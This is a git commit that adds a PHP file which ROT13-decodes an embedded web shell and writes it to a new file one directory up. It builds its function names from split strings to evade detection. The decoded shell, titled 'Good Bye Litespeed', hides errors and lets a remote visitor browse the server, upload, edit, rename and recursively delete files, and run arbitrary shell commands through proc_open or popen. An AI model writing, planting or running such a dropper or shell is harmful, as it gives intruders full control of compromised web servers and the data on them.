f9225440f39e80f22212bda8004adfd7c29e48a8
dan1584 <pewedandi32@gmail.com>
2025-02-20 15:28:21 +0700

    Update and rename s1234214so.php to wesdsd14so.php

---
+++ wesdsd14so.php
@@ -0,0 +1,393 @@
+<? $fileFunc = "f" . "open";
+$writeFunc = "f" . "write";
+$closeFunc = "f" . "close";
+$rotFunc = "s" . "tr_rot13";
+
+$asd = <<<'ASD'
+
+<!QBPGLCR ugzy>
+<ugzy ynat="ra">
+<urnq>
+    <zrgn punefrg="HGS-8">
+    <zrgn anzr="ivrjcbeg" pbagrag="jvqgu=qrivpr-jvqgu, vavgvny-fpnyr=1.0">
+    <gvgyr>Tbbq Olr Yvgrfcrrq</gvgyr>
+    <zrgn anzr="ebobgf" pbagrag="abvaqrk, absbyybj, abnepuvir">
+    <yvax uers="uggcf://sbagf.tbbtyrncvf.pbz/pff?snzvyl=Nevny%20Oynpx" ery="fglyrfurrg">
+    <yvax ery="fglyrfurrg" uers="uggcf://znkpqa.obbgfgencpqa.pbz/obbgfgenc/4.5.2/pff/obbgfgenc.zva.pff">
+    <fglyr>
+    obql {
+        sbag-snzvyl: 'Nevny Oynpx', fnaf-frevs;
+        pbybe: #sss;
+        znetva: 0;
+        cnqqvat: 0;
+        onpxtebhaq-pbybe: #000;
+    }
+    .erfhyg-obk-pbagnvare {
+        cbfvgvba: eryngvir;
+        znetva-gbc: 20ck;
+    }
+    .erfhyg-obk {
+        jvqgu: 100%;
+        urvtug: 200ck;
+        cnqqvat: 10ck;
+        obeqre: 1ck fbyvq #qqq;
+        obeqre-enqvhf: 5ck;
+        onpxtebhaq-pbybe: #343n40;
+        pbybe: #sss;
+        biresybj: nhgb;
+        obk-fvmvat: obeqre-obk;
+        sbag-snzvyl: 'Nevny Oynpx', fnaf-frevs;
+    }
+    .erfhyg-obk::cynprubyqre {
+        pbybe: #999;
+    }
+    .erfhyg-obk:sbphf {
+        bhgyvar: abar;
+        obeqre-pbybe: #128616;
+    }
+    .erfhyg-obk::-jroxvg-fpebyyone {
+        jvqgu: 8ck;
+    }
+    .erfhyg-obk::-jroxvg-fpebyyone-guhzo {
+        onpxtebhaq-pbybe: #128616;
+        obeqre-enqvhf: 4ck;
+    }
+    .pbagnvare {
+        znk-jvqgu: 90%;
+        znetva: 20ck nhgb;
+        cnqqvat: 20ck;
+        onpxtebhaq-pbybe: #1r1r1r;
+        obeqre-enqvhf: 5ck;
+        obk-funqbj: 0 0 10ck eton(0, 0, 0, 0.1);
+    }
+    .urnqre {
+        grkg-nyvta: pragre;
+        znetva-obggbz: 20ck;
+    }
+    .urnqre u1 {
+        sbag-fvmr: 24ck;
+    }
+    .fhournqre {
+        grkg-nyvta: pragre;
+        znetva-obggbz: 20ck;
+    }
+    .fhournqre c {
+        sbag-fvmr: 16ck;
+        sbag-fglyr: vgnyvp;
+    }
+    sbez {
+        znetva-obggbz: 20ck;
+    }
+    sbez vachg[glcr="grkg"],
+    sbez grkgnern {
+        jvqgu: 100%;
+        cnqqvat: 8ck;
+        znetva-obggbz: 10ck;
+        obeqre: 1ck fbyvq #qqq;
+        obeqre-enqvhf: 3ck;
+        obk-fvmvat: obeqre-obk;
+        onpxtebhaq-pbybe: #343n40;
+        pbybe: #sss;
+    }
+    sbez vachg[glcr="fhozvg"] {
+        jvqgu: 100%;
+        cnqqvat: 10ck;
+        onpxtebhaq-pbybe: #6p757q;
+        pbybe: juvgr;
+        obeqre: abar;
+        obeqre-enqvhf: 3ck;
+        phefbe: cbvagre;
+    }
+    .erfhyg-obk {
+        jvqgu: 100%;
+        urvtug: 200ck;
+        erfvmr: abar;
+        biresybj: nhgb;
+        sbag-snzvyl: 'Nevny Oynpx';
+        onpxtebhaq-pbybe: #343n40;
+        pbybe: #sss;
+        cnqqvat: 10ck;
+        obeqre: 1ck fbyvq #qqq;
+        znetva-obggbz: 10ck;
+    }
+    sbez vachg[glcr="fhozvg"]:ubire {
+        onpxtebhaq-pbybe: #5n6268;
+    }
+    gnoyr {
+        jvqgu: 100%;
+        obeqre-pbyyncfr: pbyyncfr;
+        znetva-gbc: 20ck;
+        pbybe: #sss;
+    }
+    gu, gq {
+        cnqqvat: 8ck;
+        grkg-nyvta: yrsg;
+    }
+    gu {
+        onpxtebhaq-pbybe: #5p5p5p;
+    }
+    ge:agu-puvyq(rira) {
+        onpxtebhaq-pbybe: #343n40;
+    }
+    .vgrz-anzr {
+        znk-jvqgu: 200ck;
+        biresybj: uvqqra;
+        grkg-biresybj: ryyvcfvf;
+        juvgr-fcnpr: abjenc;
+    }
+    .fvmr, .qngr {
+        jvqgu: 100ck;
+    }
+    .crezvffvba {
+        sbag-jrvtug: obyq;
+        jvqgu: 50ck;
+        grkg-nyvta: pragre;
+    }
+    .jevgnoyr {
+        pbybe: #0qo202;
+    }
+    .abg-jevgnoyr {
+        pbybe: #q60909;
+    }
+    grkgnern[anzr="svyr_pbagrag"] {
+        jvqgu: pnyp(100.9% - 10ck);
+        znetva-obggbz: 10ck;
+        cnqqvat: 8ck;
+        znk-urvtug: 500ck;
+        erfvmr: iregvpny;
+        obeqre: 1ck fbyvq #qqq;
+        obeqre-enqvhf: 3ck;
+        sbag-snzvyl: 'Nevny Oynpx';
+        onpxtebhaq-pbybe: #343n40;
+        pbybe: #sss;
+    }
+    </fglyr>
+</urnq>
+<obql>
+<qvi pynff="pbagnvare">
+<?cuc
+reebe_ercbegvat(0);
+frg_gvzr_yvzvg(0);
+$gvzrmbar = qngr_qrsnhyg_gvzrmbar_trg();
+qngr_qrsnhyg_gvzrmbar_frg($gvzrmbar);
+$ebbgQverpgbel = ernycngu($_FREIRE['QBPHZRAG_EBBG']);
+$fpevcgQverpgbel = qveanzr(__SVYR__);
+
+shapgvba k($o) {
+    erghea onfr64_rapbqr($o);
+}
+
+shapgvba l($o) {
+    erghea onfr64_qrpbqr($o);
+}
+
+sbernpu ($_TRG nf $p => $q) $_TRG[$p] = l($q);
+
+$pheeragQverpgbel = ernycngu(vffrg($_TRG['q']) ? $_TRG['q'] : $ebbgQverpgbel);
+puqve($pheeragQverpgbel);
+
+$ivrjPbzznaqErfhyg = '';
+
+vs ($_FREIRE['ERDHRFG_ZRGUBQ'] === 'CBFG') {
+    vs (vffrg($_SVYRF['svyrGbHcybnq'])) {
+        $gnetrg_svyr = $pheeragQverpgbel . '/' . onfranzr($_SVYRF["svyrGbHcybnq"]["anzr"]);
+        vs (zbir_hcybnqrq_svyr($_SVYRF["svyrGbHcybnq"]["gzc_anzr"], $gnetrg_svyr)) {
+            rpub "Svyr " . ugzyfcrpvnypunef(onfranzr($_SVYRF["svyrGbHcybnq"]["anzr"])) . " Hcybnq fhpprff";
+        } ryfr {
+            rpub "Fbeel, gurer jnf na reebe hcybnqvat lbhe svyr.";
+        }
+    } ryfrvs (vffrg($_CBFG['sbyqre_anzr']) && !rzcgl($_CBFG['sbyqre_anzr'])) {
+        $arjSbyqre = $pheeragQverpgbel . '/' . $_CBFG['sbyqre_anzr'];
+        vs (!svyr_rkvfgf($arjSbyqre)) {
+            zxqve($arjSbyqre);
+            rpub '<ue>Sbyqre perngrq fhpprffshyyl!';
+        } ryfr {
+            rpub '<ue>Reebe: Sbyqre nyernql rkvfgf!';
+        }
+    } ryfrvs (vffrg($_CBFG['svyr_anzr']) && !rzcgl($_CBFG['svyr_anzr'])) {
+        $svyrAnzr = $_CBFG['svyr_anzr'];
+        $arjSvyr = $pheeragQverpgbel . '/' . $svyrAnzr;
+        vs (!svyr_rkvfgf($arjSvyr)) {
+            vs (svyr_chg_pbagragf($arjSvyr, $_CBFG['svyr_pbagrag']) !== snyfr) {
+                rpub '<ue>Svyr perngrq fhpprffshyyl!';
+            } ryfr {
+                rpub '<ue>Reebe: Snvyrq gb perngr svyr!';
+            }
+        } ryfr {
+            vs (svyr_chg_pbagragf($arjSvyr, $_CBFG['svyr_pbagrag']) !== snyfr) {
+                rpub '<ue>Svyr rqvgrq fhpprffshyyl!';
+            } ryfr {
+                rpub '<ue>Reebe: Snvyrq gb rqvg svyr!';
+            }
+        }
+    } ryfrvs (vffrg($_CBFG['qryrgr_svyr'])) {
+        $svyrGbQryrgr = $pheeragQverpgbel . '/' . $_CBFG['qryrgr_svyr'];
+        vs (svyr_rkvfgf($svyrGbQryrgr)) {
+            vs (vf_qve($svyrGbQryrgr)) {
+                vs (qryrgrQverpgbel($svyrGbQryrgr)) {
+                    rpub '<ue>Sbyqre qryrgrq fhpprffshyyl!';
+                } ryfr {
+                    rpub '<ue>Reebe: Snvyrq gb qryrgr sbyqre!';
+                }
+            } ryfr {
+                vs (hayvax($svyrGbQryrgr)) {
+                    rpub '<ue>Svyr qryrgrq fhpprffshyyl!';
+                } ryfr {
+                    rpub '<ue>Reebe: Snvyrq gb qryrgr svyr!';
+                }
+            }
+        } ryfr {
+            rpub '<ue>Reebe: Svyr be qverpgbel abg sbhaq!';
+        }
+    } ryfrvs (vffrg($_CBFG['eranzr_vgrz']) && vffrg($_CBFG['byq_anzr']) && vffrg($_CBFG['arj_anzr'])) {
+        $byqAnzr = $pheeragQverpgbel . '/' . $_CBFG['byq_anzr'];
+        $arjAnzr = $pheeragQverpgbel . '/' . $_CBFG['arj_anzr'];
+        vs (svyr_rkvfgf($byqAnzr)) {
+            vs (eranzr($byqAnzr, $arjAnzr)) {
+                rpub '<ue>Vgrz eranzrq fhpprffshyyl!';
+            } ryfr {
+                rpub '<ue>Reebe: Snvyrq gb eranzr vgrz!';
+            }
+        } ryfr {
+            rpub '<ue>Reebe: Vgrz abg sbhaq!';
+        }
+    } ryfrvs (vffrg($_CBFG['pzq_vachg'])) {
+    $pbzznaq = $_CBFG['pzq_vachg'];
+    $qrfpevcgbefcrp = [
+        0 => ['cvcr', 'e'],
+        1 => ['cvcr', 'j'],
+        2 => ['cvcr', 'j']
+    ];
+    $cebprff = cebp_bcra($pbzznaq, $qrfpevcgbefcrp, $cvcrf);
+    vs (vf_erfbhepr($cebprff)) {
+        $bhgchg = fgernz_trg_pbagragf($cvcrf[1]);
+        $reebef = fgernz_trg_pbagragf($cvcrf[2]);
+        spybfr($cvcrf[1]);
+        spybfr($cvcrf[2]);
+        cebp_pybfr($cebprff);
+        vs (!rzcgl($reebef)) {
+            $ivrjPbzznaqErfhyg = '<ue><c>Erfhyg:</c><grkgnern pynff="erfhyg-obk">' . ugzyfcrpvnypunef($reebef) . '</grkgnern>';
+        } ryfr {
+            $ivrjPbzznaqErfhyg = '<ue><c>Erfhyg:</c><grkgnern pynff="erfhyg-obk">' . ugzyfcrpvnypunef($bhgchg) . '</grkgnern>';
+        }
+    } ryfr {
+        $cebprff = cbcra($pbzznaq . ' 2>&1', 'e');
+        vs (vf_erfbhepr($cebprff)) {
+            $bhgchg = '';
+            juvyr (!srbs($cebprff)) {
+                $bhgchg .= sernq($cebprff, 4096);
+            }
+            cpybfr($cebprff);
+            $ivrjPbzznaqErfhyg = '<ue><c>Erfhyg:</c><grkgnern pynff="erfhyg-obk">' . ugzyfcrpvnypunef($bhgchg) . '</grkgnern>';
+        } ryfr {
+            $ivrjPbzznaqErfhyg = '<ue><c>Reebe: Snvyrq gb rkrphgr pbzznaq!</c>';
+        }
+    }
+} ryfrvs (vffrg($_CBFG['ivrj_svyr'])) {
+        $svyrGbIvrj = $pheeragQverpgbel . '/' . $_CBFG['ivrj_svyr'];
+        vs (svyr_rkvfgf($svyrGbIvrj)) {
+            $svyrPbagrag = svyr_trg_pbagragf($svyrGbIvrj);
+            $ivrjPbzznaqErfhyg = '<ue><c>Erfhyg: ' . $_CBFG['ivrj_svyr'] . '</c><grkgnern pynff="erfhyg-obk">' . ugzyfcrpvnypunef($svyrPbagrag) . '</grkgnern>';
+        } ryfr {
+            $ivrjPbzznaqErfhyg = '<ue><c>Reebe: Svyr abg sbhaq!</c>';
+        }
+    }
+}
+
+rpub '<pragre>
+<qvi pynff="svt-nafv">
+<cer vq="gnnt_sbag_NAFVFunqbj" pynff="svt-nafv"><fcna fglyr="pbybe: eto(67, 142, 241);">   <fgebat>  __    Olr Olr Yvgrfcrrq   _____ __    
+    __|  |___ ___ ___ ___ ___   |   __|  | i.1.3
+|  |  | .\'| . | . | .\'|   |  |__   |  |__ 
+|_____|__,|_  |___|__,|_|_|  |_____|_____|
+                |___| ./Urnegmm                      </fgebat> </fcna></cer>
+</qvi>
+</pragre>';
+rpub "Mban jnxgh freire: " . $gvzrmbar . "<oe>";
+rpub "Jnxgh freire fnng vav: " . qngr('L-z-q U:v:f');
+rpub '<ue>Pheqve: ';
+
+$qverpgbevrf = rkcybqr(QVERPGBEL_FRCNENGBE, $pheeragQverpgbel);
+$pheeragCngu = '';
+$ubzrYvaxCevagrq = snyfr;
+sbernpu ($qverpgbevrf nf $vaqrk => $qve) {
+    $pheeragCngu .= QVERPGBEL_FRCNENGBE . $qve;
+    vs ($vaqrk == 0) {
+        rpub ' / <n uers="?q=' . k($pheeragCngu) . '">' . $qve . '</n>';
+    } ryfr {
+        rpub ' / <n uers="?q=' . k($pheeragCngu) . '">' . $qve . '</n>';
+    }
+}
+
+rpub '<n uers="?q=' . k($fpevcgQverpgbel) . '"> / <fcna fglyr="pbybe: terra;">[ TB Ubzr ]</fcna></n>';
+rpub '<oe>';
+rpub '<ue><sbez zrgubq="cbfg" npgvba="?'.(vffrg($_FREIRE['DHREL_FGEVAT']) ? $_FREIRE['DHREL_FGEVAT'] : '').'">';
+rpub '<vachg glcr="grkg" anzr="sbyqre_anzr" cynprubyqre="Arj Sbyqre Anzr" pynff="sbez-pbageby">';
+rpub '<vachg glcr="fhozvg" inyhr="Perngr Sbyqre" pynff="oga oga-frpbaqnel">';
+rpub '</sbez>';
+rpub '<sbez zrgubq="cbfg" npgvba="?'.(vffrg($_FREIRE['DHREL_FGEVAT']) ? $_FREIRE['DHREL_FGEVAT'] : '').'">';
+rpub '<vachg glcr="grkg" anzr="svyr_anzr" cynprubyqre="Perngr Arj Svyr / Rqvg Rkvfgvat Svyr" pynff="sbez-pbageby">';
+rpub '<grkgnern anzr="svyr_pbagrag" cynprubyqre="Svyr Pbagrag (sbe arj svyr) be Rqvg Pbagrag (sbe rkvfgvat svyr)" pynff="sbez-pbageby"></grkgnern>';
+rpub '<vachg glcr="fhozvg" inyhr="Perngr / Rqvg Svyr" pynff="oga oga-frpbaqnel">';
+rpub '</sbez>';
+rpub '<sbez zrgubq="cbfg" rapglcr="zhygvcneg/sbez-qngn">';
+rpub '<ue>';
+rpub '<vachg glcr="svyr" anzr="svyrGbHcybnq" vq="svyrGbHcybnq" cynprubyqre="cvyvu svyr:" pynff="sbez-pbageby">';
+rpub '<ue>';
+rpub '<vachg glcr="fhozvg" inyhr="Hcybnq Svyr" anzr="fhozvg" pynff="oga oga-frpbaqnel">';
+rpub '</sbez>';
+rpub '<sbez zrgubq="cbfg" npgvba="?'.(vffrg($_FREIRE['DHREL_FGEVAT']) ? $_FREIRE['DHREL_FGEVAT'] : '').'"><vachg glcr="grkg" anzr="pzq_vachg" cynprubyqre="Ragre pbzznaq" pynff="sbez-pbageby"><vachg glcr="fhozvg" inyhr="Eha Pbzznaq" pynff="oga oga-frpbaqnel"></sbez>';
+rpub $ivrjPbzznaqErfhyg;
+rpub '<qvi>';
+rpub '</qvi>';
+rpub '<gnoyr pynff="gnoyr gnoyr-qnex">';
+rpub '<oe><ge><gu><pragre>Vgrz Anzr</gu><gu><pragre>Fvmr</gu><gu><pragre>Qngr</gu><gu>Crezvffvbaf</gu><gu><pragre>Ivrj</gu><gu><pragre>Qryrgr</gu><gu><pragre>Eranzr</gu></ge></pragre></pragre></pragre>';
+sbernpu (fpnaqve($pheeragQverpgbel) nf $i) {
+    $h = ernycngu($i);
+    $f = fgng($h);
+    $vgrzYvax = vf_qve($i) ? '?q=' . k($pheeragQverpgbel . '/' . $i) : '?'.('q='.k($pheeragQverpgbel).'&s='.k($i));
+    $crezvffvba = fhofge(fcevags('%b', svyrcrezf($h)), -4);
+    $jevgnoyr = vf_jevgnoyr($h);
+    rpub '<ge>
+            <gq pynff="vgrz-anzr"><n uers="'.$vgrzYvax.'">'.$i.'</n></gq>
+            <gq pynff="fvmr">'.svyrfvmr($h).'</gq>
+            <gq pynff="qngr" fglyr="grkg-nyvta: pragre;">'.qngr('L-z-q U:v:f', svyrzgvzr($h)).'</gq>
+            <gq pynff="crezvffvba '.($jevgnoyr ? 'jevgnoyr' : 'abg-jevgnoyr').'">'.$crezvffvba.'</gq>
+            <gq><sbez zrgubq="cbfg" npgvba="?'.(vffrg($_FREIRE['DHREL_FGEVAT']) ? $_FREIRE['DHREL_FGEVAT'] : '').'"><vachg glcr="uvqqra" anzr="ivrj_svyr" inyhr="'.ugzyfcrpvnypunef($i).'"><vachg glcr="fhozvg" inyhr=" Ivrj " pynff="oga oga-frpbaqnel"></sbez></gq>
+            <gq><sbez zrgubq="cbfg" npgvba="?'.(vffrg($_FREIRE['DHREL_FGEVAT']) ? $_FREIRE['DHREL_FGEVAT'] : '').'"><vachg glcr="uvqqra" anzr="qryrgr_svyr" inyhr="'.ugzyfcrpvnypunef($i).'"><vachg glcr="fhozvg" inyhr="Qryrgr" pynff="oga oga-frpbaqnel"></sbez></gq>
+            <gq><sbez zrgubq="cbfg" npgvba="?'.(vffrg($_FREIRE['DHREL_FGEVAT']) ? $_FREIRE['DHREL_FGEVAT'] : '').'"><vachg glcr="uvqqra" anzr="byq_anzr" inyhr="'.ugzyfcrpvnypunef($i).'"><vachg glcr="grkg" anzr="arj_anzr" cynprubyqre="Arj Anzr" pynff="sbez-pbageby"><vachg glcr="fhozvg" anzr="eranzr_vgrz" inyhr="Eranzr" pynff="oga oga-frpbaqnel"></sbez></gq>
+        </ge>';
+}
+
+rpub '</gnoyr>';
+shapgvba qryrgrQverpgbel($qve) {
+    vs (!svyr_rkvfgf($qve)) {
+        erghea gehr;
+    }
+    vs (!vf_qve($qve)) {
+        erghea hayvax($qve);
+    }
+    sbernpu (fpnaqve($qve) nf $vgrz) {
+        vs ($vgrz == '.' || $vgrz == '..') {
+            pbagvahr;
+        }
+        vs (!qryrgrQverpgbel($qve . QVERPGBEL_FRCNENGBE . $vgrz)) {
+            erghea snyfr;
+        }
+    }
+    erghea ezqve($qve);
+}
+?>
+</qvi>
+<fpevcg fep="uggcf://pbqr.wdhrel.pbz/wdhrel-3.5.1.fyvz.zva.wf"></fpevcg>
+<fpevcg fep="uggcf://pqa.wfqryvie.arg/acz/@cbccrewf/pber@2.5.4/qvfg/hzq/cbccre.zva.wf"></fpevcg>
+<fpevcg fep="uggcf://znkpqa.obbgfgencpqa.pbz/obbgfgenc/4.5.2/wf/obbgfgenc.zva.wf"></fpevcg>
+</obql>
+</ugzy>
+
+
+ASD;
+
+$file = $fileFunc("../dgfhdfyyfhksfdh.php", "w");
+$writeFunc($file, $rotFunc($asd));
+$closeFunc($file); ?>
